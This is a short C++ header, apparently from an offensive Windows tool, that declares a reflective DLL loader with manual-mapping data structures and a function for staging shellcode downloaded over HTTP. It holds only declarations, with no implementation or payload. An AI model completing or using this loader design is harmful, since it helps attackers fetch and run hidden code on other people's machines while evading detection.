#pragma once

#include "Vendetta.h"
#include <wininet.h>    

#pragma comment(lib, "wininet.lib")

using f_LoadLibraryA = HINSTANCE(WINAPI*)(LPCSTR lpLibFilename);
using f_GetProcAddress = FARPROC(WINAPI*)(HMODULE hModule, LPCSTR lpProcName);
using f_DLL_ENTRY_POINT = BOOL(WINAPI*)(LPVOID hinstDLL, DWORD fdwReason, LPVOID lpvReserved);

struct MANUAL_MAPPING_DATA
{
    f_LoadLibraryA pLoadLibraryA;
    f_GetProcAddress pGetProcAddress;
    PBYTE pbase;
    DWORD fdwReasonParam;
    LPVOID reservedParam;
};

void __stdcall ReflectiveLoader(MANUAL_MAPPING_DATA* pData);
bool StagingPayloadViaHttp(const std::string& url, std::vector<BYTE>& shellcode);